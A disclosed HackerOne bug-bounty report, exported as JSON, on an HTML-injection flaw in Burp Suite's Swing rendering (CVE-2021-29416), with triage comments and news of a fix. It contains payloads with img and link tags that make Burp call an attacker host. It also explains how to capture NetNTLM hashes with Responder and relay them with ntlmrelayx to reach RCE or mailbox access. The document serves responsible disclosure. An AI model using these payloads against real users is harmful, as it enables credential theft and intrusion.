@@ -1,0 +1,737 @@
+{
+  "id": 1054382,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDU0Mzgy",
+  "url": "https://hackerone.com/reports/1054382",
+  "title": "HTML Injection in Swing can disclose netNTLM hash or cause DoS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-12-08T21:45:17.046Z",
+  "submitted_at": "2020-12-08T21:45:17.129Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "issuefinder",
+    "url": "/issuefinder",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15252,
+    "url": "https://hackerone.com/portswigger",
+    "handle": "portswigger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "PortSwigger Web Security",
+      "twitter_handle": "Burp_Suite",
+      "website": "https://portswigger.net",
+      "about": "Burp Suite is the leading software for web security testing"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-29416"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-03-29T09:27:47.942Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-28T19:37:52.370Z",
+  "team_member_agreed_on_going_public_at": "2021-03-29T09:27:47.828Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.\nDuring normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):\n- Intercepts that request, or\n- Selects that request in HTTP history (Proxy tab), or\n- Sends that request to repeater, or\n- In repeater, makes any change to the HTML code (preserving the main structure),\n\nBurp Suite will do an unsolicited hidden request to the destination specified in the \"img\" or \"link\" HTML tags.\n\nNext, you can see a GET and a POST example that trigger an unsolicited hidden request to \"http://www.rec2.ml/leak\" just by pasting them on a repeater tab:\n\n## GET request (using the \"img\" tag)\n```\nGET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1\n```\n\n## POST request (using the \"link\" tag)\n```\nPOST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>\n```\nIn fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:\n```\n?=<html><img+src='http://www.rec2.ml/leak'>\n```\n\n## Impact\n\nAn attacker can exploit this vulnerability in at least 4 different ways:\n\n\n##1. Real public IP address leak\n\nThe unsolicited hidden request does not respect the configuration in User options tab:\n- Upstream Proxy Servers\n- SOCKS proxy\n\nAn auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.\n\nAffected OS: Linux, MacOS, Windows\nPoC video: burpsuite_leak_vuln-leak.mp4\n\n\n##2. Windows NetNTLM hashes leak\n\nIf the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:\n- Username\n- Computer name or domain\n- NetNTLM hash\n\nThe NetNTLM can be cracked and therefore used at a later stage.\nTo negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).\n\nAffected OS: Windows\nPoC video: burpsuite_leak_vuln-netntlm.mp4\n\n\n##3. RCE on other machines\n\nTo perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).\nThis attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.\n\nThe HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.\nTo relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).\n\nAffected OS: Windows\nPoC video: burpsuite_leak_vuln-rce.mp4\n\n\n##4. Denial of Service (DoS).\n\nIf the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.\n\nAffected OS: Linux, MacOS, Windows\nPoC video: burpsuite_leak_vuln-dos.mp4",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1109393,
+      "file_name": "burpsuite_leak_vuln-leak.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x2u0uz66znjxxraueyluscaa89e7?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-leak.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-leak.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071512Z&X-Amz-Expires=1661&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6a81b11c7628e3d4466c1bdb86e01a6aba45e82d5f1a33f90a2f66ff604adb14",
+      "file_size": 2108199,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1109394,
+      "file_name": "burpsuite_leak_vuln-netntlm.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x6jcbckqgcl6o6170r79kvpfu4sf?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-netntlm.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-netntlm.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071512Z&X-Amz-Expires=1661&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c71f48b43baca4970fd9cb7631d4a487b8d9d2f682adaf3e965feb9425b6d3f7",
+      "file_size": 1972485,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1109395,
+      "file_name": "burpsuite_leak_vuln-dos.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b4p63aj0sqsbwtw81u8y9zkybns8?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-dos.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-dos.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071512Z&X-Amz-Expires=1661&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4534bfbd5cac52aa3e7f1ab2bd3911eb20b7e0df77ea3fc0a51e0de4d9bd95b7",
+      "file_size": 1703380,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1109396,
+      "file_name": "burpsuite_leak_vuln-rce.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zlzx9uj5bsqfy6s19ib2vwnzd13c?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-rce.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-rce.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071512Z&X-Amz-Expires=1661&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=358df9b39837dc8ae6dbf1e8788ced2d2cdb49d77824666ee0894774b74241ed",
+      "file_size": 4433864,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-04-27T19:37:52.434Z",
+  "allow_singular_disclosure_after": -75901039.65377763,
+  "singular_disclosure_allowed": true,
+  "vote_count": 113,
+  "voters": [
+    "rootz491",
+    "bigmac4life",
+    "n1m0",
+    "foobar7",
+    "ramsexy",
+    "hrdfrdh",
+    "trieulieuf9",
+    "tess",
+    "spam404",
+    "remonsec",
+    "and 103 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 169,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Burp Suite Pro/Community",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 10049173,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2020-12-09T09:06:18.414Z",
+      "updated_at": "2020-12-09T09:06:18.414Z",
+      "additional_data": {
+        "old_severity": "High (7.4)",
+        "new_severity": "Low",
+        "old_severity_id": 928374,
+        "new_severity_id": 928761
+      },
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10049252,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thank you for the report, I've confirmed the behaviour and the IP address disclosure. We will be treating this as medium/low as our our view is that preventing NTLM hashes leaking to external domains is the responsibility of the  firewall. Similarly, denial of service vulnerabilities are explicitly out of scope for our program.",
+      "automated_response": false,
+      "created_at": "2020-12-09T09:14:29.565Z",
+      "updated_at": "2020-12-09T09:14:29.565Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10049487,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I almost forgot to say, nice catch! We will be exploring this from our side and if we identify further potential attacks we will update the severity. I'm curious to see if whatever is doing this rendering is hardened.",
+      "automated_response": false,
+      "created_at": "2020-12-09T09:39:46.997Z",
+      "updated_at": "2020-12-09T09:39:46.997Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10060194,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello, we are also very curious to know if the issue (internal component doing unsolicited hidden request) can be further exploited :-)\n\nOn the other hand, we are a bit disappointed with the assigned severity (low). We are facing an issue that is triggered by any typical user interaction (intercept, a click during proxy history analysis, send to repeater, modify the request in repeater), so the probability is high and the associated impact is relevant (real public IP address leak, NetNTLM leak, RCE on other machines and DoS).\n\nWe accept that the DoS impact is out of the scope. It's a pity because it can be used as a defensive technique by Blue Teams to detect and hang auditors Burp Suite sessions. Also, it is not caused by a negligent auditor behaviour, nor by the environment (OS) where Burp Suite is running, it is due a special request received over the network and the strange behaviour of an internal component of Burp Suite.\n\nWe don’t share that preventing NTLM hashes leaking to external domains is responsibility of the firewall. Our opinion is that:\n-\tNetNTLM hashes leak can be also done internally, where the internal attacker and the victim (auditor) are on the same internal network. Here no perimeter firewall can filter outbound SMB requests on port 445. We can agree that there are internal attackers, not just external ones.\n-\tUsing a perimeter firewall or a personal firewall could be a good mitigation (an extra defensive layer) for this issue but the root issue is in Burp Suite where the fix must be done. It’s important to note that not everyone has a perimeter or personal firewall filtering outbound SMB requests. Also, we don’t see either one as a requirement to install Burp Suite on a computer.\n-\tFinally, NetNTLM hashes leak is one way to exploit this issue, but there is another important one (the NTLM relay) widely used in internal pentests, not commented on your answer, to achieve RCE on internal Windows machines which in this case can be triggered with one click.\n\nWe would greatly appreciate if you could consider the above arguments to re-evaluate the current assigned severity.",
+      "automated_response": false,
+      "created_at": "2020-12-10T09:45:21.531Z",
+      "updated_at": "2020-12-10T09:45:21.531Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10060697,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for your reply. The NetNTLM issues come from the operating system's network stack, and as I understand it affect practically everything that makes a network request - you can replicate it using Java's core net.URL library. It's not really my area but I believe it's even possible to trigger it via Internet Explorer with a little effort. This means that the only way to secure a system against that threat is a firewall or registry tweak.\n\nWe have identified that the rendering is being done by Swing's HTML parser, which we use to render HTML in scanner issue descriptions. We have previously audited this and think it's robust by virtual of being so basic but feel free to take a look yourself. https://docs.oracle.com/javase/tutorial/uiswing/components/html.html\n\nPlease note the 'low' severity is not final; this may land at medium depending on internal discussions.",
+      "automated_response": false,
+      "created_at": "2020-12-10T10:08:30.262Z",
+      "updated_at": "2020-12-10T10:08:30.262Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10094363,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We have released an initial fix for this in 2020.12, and are currently exploring a broader mitigation before closing/rewarding this. \n\nhttps://portswigger.net/burp/releases/professional-community-2020-12",
+      "automated_response": false,
+      "created_at": "2020-12-14T09:25:47.497Z",
+      "updated_at": "2020-12-14T09:25:47.497Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10130029,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Great news! A very quick fix. Well done!",
+      "automated_response": false,
+      "created_at": "2020-12-17T09:24:18.717Z",
+      "updated_at": "2020-12-17T09:24:18.717Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10130047,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We have been exploring new ways to demonstrate impact.\nIn the following PoC the:\n-\tvictim (auditor) is inside the corporate network\n-\tattacker is outside (Internet)\n-\tOWA is accessible from the Internet\n\nWith this scenario and taking advantage of the SMB relay negotiation, an external attacker could access the emails of the internal user (victim/auditor), but also:\n-\tAdd rules (persistence)\n-\tGet the Global Address List (discovery)\n-\tSend emails as the victim (social engineering)\n\nPoC video: burpsuite_leak_vuln-exchange.mp4",
+      "automated_response": false,
+      "created_at": "2020-12-17T09:25:51.069Z",
+      "updated_at": "2020-12-17T09:25:51.069Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1119780,
+          "filename": "burpsuite_leak_vuln-exchange.mp4",
+          "type": "video/mp4",
